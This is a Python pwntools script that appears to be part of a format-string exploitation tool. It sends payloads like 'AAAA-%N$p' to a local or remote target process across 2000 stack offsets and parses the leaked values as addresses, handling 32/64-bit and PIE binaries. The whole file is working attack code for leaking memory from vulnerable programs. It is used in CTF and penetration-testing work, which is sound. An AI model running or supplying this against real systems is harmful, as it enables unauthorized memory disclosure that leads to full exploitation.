#!/usr/bin/python3

from pwn import *

from argsprint import *
from parseaddresses import *


def writePayload(es, i):

    FMT = b""
    if not es.RS:
        if es.ARCH == 1 or es.ARCH == 2:
            FMT = b"AAAA-%" + str(i).encode() + b"$" + es.FMTCHAR
        elif es.ARCH == 3:
            FMT = b"AAAAAAAA-%" + str(i).encode() + b"$" + es.FMTCHAR
    else:
        if es.ARCH == 1 or es.ARCH == 2:
            FMT = b"%" + str(i).encode() + b"$" + es.FMTCHAR + b"-AAAA"
        elif es.ARCH == 3:
            FMT = b"%" + str(i).encode() + b"$" + es.FMTCHAR + b"-AAAAAAAA"
    return FMT


def parseResponse(es, res, i):

    try:
        ADR = str(res.split(b'-')[1])
        ADR = ADR.split('\'')[1]
        if es.ARCH == 3:
            parseAdresse64(es.ARCH, es.PIE, i, ADR)
        else:
            parseAdresse32(es.ARCH, es.PIE, i, ADR)
    except:
        pass

    # Pour le reverse payload :
    # ADR = str(res.split(b'-')[1])
    #   ADR = ADR.split('\'')[1]
     


def showPayload(i, FMT):
    M = i%100
    if M == 0:
        printLight("Payload : {0}".format(FMT))


def readStackRemote(es):

    if not es.OPENAGAIN:
        r = remoteConnect()

    BEACH = range(0,2000,1)
    for i in BEACH:

        if es.OPENAGAIN:
            r = remoteConnect()

        FMT = writePayload(es, i)
        if es.SP:
            showPayload(i, FMT)

        try:
            r.send(FMT)
        except EOFError:
            if es.FMTCHAR == b's' and es.RS == False:
                printError("Null byte trouble in payload ; use -rs option with -p")
            printError("Can\'t send payload ; last tested offset was {0}".format(i - 1) + CEND)


        try:
            res = r.recv()
        except EOFError:
            pass

        parseResponse(es, res, i)
        
        if es.CLOSE:
            r.close()
        #sleep(0.04)


def readStackLocal(es):

    if not es.OPENAGAIN:
        p = startProcess()

    BEACH = range(0,2000,1)
    for i in BEACH:

        if es.OPENAGAIN:
            p = startProcess()

        FMT = writePayload(es, i)
        if es.SP:
            showPayload(i, FMT)
        p.send(FMT)

        try:
            res = p.recv()
        except EOFError:
            pass

        parseResponse(es, res, i)

        if es.CLOSE:
            p.close()
